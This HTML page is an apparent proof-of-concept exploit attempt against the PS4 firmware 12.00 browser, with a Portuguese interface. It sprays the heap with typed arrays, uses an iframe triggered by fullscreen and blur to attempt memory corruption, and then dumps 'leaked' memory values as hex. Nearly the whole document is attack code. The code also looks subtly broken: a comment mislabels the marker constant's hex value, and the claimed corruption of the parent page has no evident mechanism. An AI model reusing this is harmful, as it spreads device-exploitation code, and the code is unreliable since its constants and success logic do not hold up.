<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Memory Leak Test - Leandro</title>
</head>
<body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">

    <h1>PS4 12.00 - Persistence & Memory Leak</h1>
    <p>Status: <span id="status-pai" style="font-weight:bold; color: #555;">Aguardando Preparação...</span></p>

    <button onclick="prepareObjects()" style="padding: 12px; cursor: pointer;">1. Preparar Objetos (Pai)</button>
    <button onclick="setupIframe()" style="padding: 12px; cursor: pointer;">2. Injetar Iframe de Gatilho</button>
    <button onclick="checkPersistence()" style="padding: 12px; cursor: pointer; background-color: #c8e6c9;">3. Verificar e Vazar Memória</button>

    <hr>
    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px;">
        </div>

    <div id="frame-container" style="margin-top: 20px;">
        </div>

    <script>
        const PATTERN = 2.121995791e-314; // 0x4141414141414141
        let controllers = [];
        const statusPai = document.getElementById('status-pai');
        const leakOutput = document.getElementById('leak-output');

        // PASSO 1: Preparar memória no Pai
        function prepareObjects() {
            controllers = [];
            for(let i = 0; i < 5000; i++) {
                let arr = new Float64Array(8);
                arr[0] = i; 
                controllers.push(arr);
            }
            statusPai.innerText = "5000 Objetos na RAM. Injete o Iframe.";
            statusPai.style.color = "blue";
            leakOutput.style.display = "none";
        }

        // PASSO 2: Configurar Gatilho no Iframe
        function setupIframe() {
            const container = document.getElementById('frame-container');
            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:1px solid red;"></iframe>';
            
            const frame = document.getElementById('pocFrame');
            const fDoc = frame.contentWindow.document;

            fDoc.open();
            fDoc.write(`
                <html>
                <body>
                    <h4>Gatilho Ativo</h4>
                    <button onclick="startPoC()" style="padding:10px;">FULLSCREEN + OPTIONS</button>
                    <script>
                        window.startPoC = function() {
                            if (document.documentElement.webkitRequestFullscreen) 
                                document.documentElement.webkitRequestFullscreen();
                            
                            window.onblur = function() {
                                let spray = [];
                                for(let i = 0; i < 8000; i++) {
                                    let p = new Float64Array(10);
                                    p.fill(${PATTERN});
                                    spray.push(p);
                                }
                                setTimeout(() => {
                                    document.open();
                                    document.write('<h1>FRAME FINALIZADO</h1>');
                                    document.close();
                                }, 1000);
                            };
                        };
                    <\/script>
                </body>
                </html>
            `);
            fDoc.close();
            statusPai.innerText = "Iframe Pronto. Use Fullscreen + OPTIONS.";
        }

        // PASSO 3: Verificar Corrupção e Vazar Endereços (Memory Leak)
        function checkPersistence() {
            let corrupted = null;
            let corruptedIndex = -1;

            for(let i = 0; i < controllers.length; i++) {
                if (controllers[i][0] === PATTERN) {
                    corrupted = controllers[i];
                    corruptedIndex = i;
                    break;
                }
            }

            if (corrupted) {
                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: Memória Corrompida no ID: " + corruptedIndex + "</span>";
                leakOutput.style.display = "block";
                leakOutput.innerHTML = "<b>[ MEMORY LEAK DETECTED ]</b><br>Dumping surrounding memory addresses:<br><br>";

                // Loop para ler e converter os valores "vazados" para Hexadecimal
                for(let i = 0; i < 8; i++) {
                    try {
                        const val = corrupted[i];
                        const buf = new ArrayBuffer(8);
                        new Float64Array(buf)[0] = val;
                        const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                        
                        leakOutput.innerHTML += "Offset [" + i + "]: 0x" + hex + "<br>";
                    } catch(e) {
                        leakOutput.innerHTML += "Offset [" + i + "]: Erro de leitura<br>";
                    }
                }
            } else {
                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: Corrupção não detectada.</span>";
            }
        }
    </script>
</body>
</html>
